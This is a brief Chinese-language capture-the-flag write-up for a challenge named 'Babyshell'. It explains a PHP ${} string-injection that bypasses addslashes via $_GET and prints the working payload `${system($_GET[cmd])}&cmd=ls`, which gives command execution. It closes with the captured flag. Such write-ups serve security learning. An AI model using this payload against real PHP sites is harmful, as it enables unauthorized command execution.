## Babyshell
hackmd 連結 : [BabyShell](https://hackmd.io/@yeyeye618/HkKzHd5seg)
熟悉的名稱
![image](https://hackmd.io/_uploads/rJhXrO5jxx.png)


熟悉的介面
![image](https://hackmd.io/_uploads/Sk1tqu9sgx.png)


熟悉的 TimeModel
![image](https://hackmd.io/_uploads/S1fur_9ilg.png)

看起來都是一樣的打法
用 ${} 做 f string 注入
而且要用 $_GET[] 做 addslash 的 bypass
```
/?format=${system($_GET[cmd])}&cmd=ls
```
![image](https://hackmd.io/_uploads/rklTSd5jgl.png)
成功

撈 flag
![image](https://hackmd.io/_uploads/rkY48Oqsgg.png)
flag: `is1abCTF{m4yb3_y0u'r3_n07_4_b4by}`
